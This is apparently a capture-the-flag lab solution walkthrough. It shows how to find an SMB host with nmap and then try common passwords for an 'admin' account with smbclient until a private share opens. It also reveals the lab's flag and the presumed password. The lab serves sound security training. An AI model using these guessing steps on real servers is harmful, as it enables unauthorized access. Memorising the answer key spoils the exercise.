# Lab 3.2: SMB Multiple Credential Testing

## Learning Objectives
- Test multiple password combinations for one user
- Understand manual credential testing
- Capture the flag

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before testing credentials.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

### Step 2: Test Common Passwords

Manually test multiple common password combinations for the admin user.

**Detailed Steps:**

1. **Create a list of common passwords to test:**
   ```
   Common passwords to try:
   - password
   - admin
   - admin123
   - password123
   - 123456
   - qwerty
   - Password123
   - admin123!
   ```

2. **Test password: "password"**
   ```bash
   smbclient //<target_ip>/private -U admin%password
   ```
   
   Replace `<target_ip>` with your actual target IP.

   **Expected responses:**
   - **Success**: Connection prompt `smb: \>`
   - **Failure**: `NT_STATUS_LOGON_FAILURE` or `NT_STATUS_ACCESS_DENIED`

3. **Test password: "admin"**
   ```bash
   smbclient //<target_ip>/private -U admin%admin
   ```

4. **Test password: "admin123"**
   ```bash
   smbclient //<target_ip>/private -U admin%admin123
   ```

5. **Test password: "password123"**
   ```bash
   smbclient //<target_ip>/private -U admin%password123
   ```

6. **Alternative: Test interactively (will prompt for password):**
   ```bash
   smbclient //<target_ip>/private -U admin
   # When prompted, try each password
   ```

**What to look for:**
- **Successful connection**: You see `smb: \>` prompt
- **Failed connection**: Error message like "NT_STATUS_LOGON_FAILURE"
- **Access denied**: May indicate correct password but insufficient permissions

### Step 3: Connect with Correct Credentials

Once you find the correct password, connect to the private share.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   smbclient //<target_ip>/private -U admin%admin123
   ```
   
   (Assuming "admin123" was the correct password - replace with actual discovered password)

2. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

3. **Verify you're connected:**
   ```bash
   pwd
   ls
   ```

**Troubleshooting:**
- If connection fails, double-check the password
- Verify username is correct: `admin` (case-sensitive)
- Try different share names if `private` doesn't work: `Private`, `PRIVATE`

### Step 4: Retrieve Flag

Download the flag file from the private share.

**Detailed Steps:**

1. **List files in the share:**
   ```bash
   ls
   ```

   **Expected output:**
   ```
     .                                   D        0  Mon Jan 15 10:00:00 2024
     ..                                  D        0  Mon Jan 15 10:00:00 2024
     flag.txt                            A       45  Mon Jan 15 10:00:00 2024
   
                   524288 blocks of size 1024. 524288 blocks available
   ```

2. **Download the flag file:**
   ```bash
   get flag.txt
   ```

3. **Expected output:**
   ```
   getting file \flag.txt of size 45 as flag.txt (0.3 KiloBytes/sec) (average 0.3 KB/s)
   ```

4. **Exit SMB client:**
   ```bash
   exit
   ```

5. **View the flag:**
   ```bash
   cat flag.txt
   ```

   **Expected output:**
   ```
   OCR{smb_mult1_4uth}
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{smb_mult1_4uth}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and SMB service accessibility
- ✅ Tested multiple common passwords manually
- ✅ Identified correct password through systematic testing
- ✅ Successfully connected to private share with correct credentials
- ✅ Listed files in the share
- ✅ Downloaded flag.txt using `get` command
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Manual credential testing helps understand authentication process
- Common passwords are often used in lab environments
- Systematic testing ensures no passwords are missed
- Understanding error messages helps identify correct credentials

## Common Mistakes
- Not trying common passwords
- Giving up too quickly
- Not testing systematically

## Hints
1. Username: admin
2. Try common passwords
3. Password is in common wordlists